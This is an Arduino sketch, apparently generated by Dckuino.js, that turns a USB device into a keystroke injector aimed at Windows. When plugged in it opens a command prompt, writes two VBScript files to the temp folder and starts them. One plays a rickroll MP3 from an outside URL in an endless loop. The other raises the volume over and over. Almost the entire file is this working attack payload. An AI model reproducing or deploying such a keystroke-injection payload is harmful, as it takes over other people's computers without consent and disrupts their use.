/*
 * Generated with <3 by Dckuino.js, an open source project !
 */

#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(100);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

// Wait 10000ms
delay(10000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
   delay(200);
  Keyboard.releaseAll();
  delay(200);
  Keyboard.print("cmd");
  typeKey(KEY_RETURN);

  delay(400);

  Keyboard.print("del %tmp%\\rickyou.vbs");

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.print("del %tmp%\\volup.vbs");

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.print("cd %tmp% && copy con rickyou.vbs");

  typeKey(KEY_RETURN);

  Keyboard.print("While true");

  typeKey(KEY_RETURN);

  Keyboard.print("Dim oPlayer");

  typeKey(KEY_RETURN);

  Keyboard.print("Set oPlayer = CreateObject(\"WMPlayer.OCX\")");

  typeKey(KEY_RETURN);

  Keyboard.print("oPlayer.URL = \"https://perso.telecom-paristech.fr/rguilloteau/rickroll.mp3\"");

  typeKey(KEY_RETURN);

  Keyboard.print("oPlayer.controls.play");

  typeKey(KEY_RETURN);

  Keyboard.print("While oPlayer.playState <> 1 ' 1 = Stopped");

  typeKey(KEY_RETURN);

  Keyboard.print("WScript.Sleep 100");

  typeKey(KEY_RETURN);

  Keyboard.print("Wend");

  typeKey(KEY_RETURN);

  Keyboard.print("oPlayer.close");

  typeKey(KEY_RETURN);

  Keyboard.print("Wend");

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('z');
  Keyboard.releaseAll();

  typeKey(KEY_RETURN);

  Keyboard.print("copy con volup.vbs");

  typeKey(KEY_RETURN);

  Keyboard.print("Set WshShell = CreateObject(\"WScript.Shell\")");

  typeKey(KEY_RETURN);

  Keyboard.print("While true");
  typeKey(KEY_RETURN);

  Keyboard.print("WshShell.SendKeys(chr(&hAF))");

  typeKey(KEY_RETURN);

  Keyboard.print("WScript.Sleep 10");

  typeKey(KEY_RETURN);

  Keyboard.print("Wend");

  typeKey(KEY_RETURN);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('z');
  Keyboard.releaseAll();

  typeKey(KEY_RETURN);

  Keyboard.print("start volup.vbs && rickyou.vbs");

  typeKey(KEY_RETURN);

  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop(){}
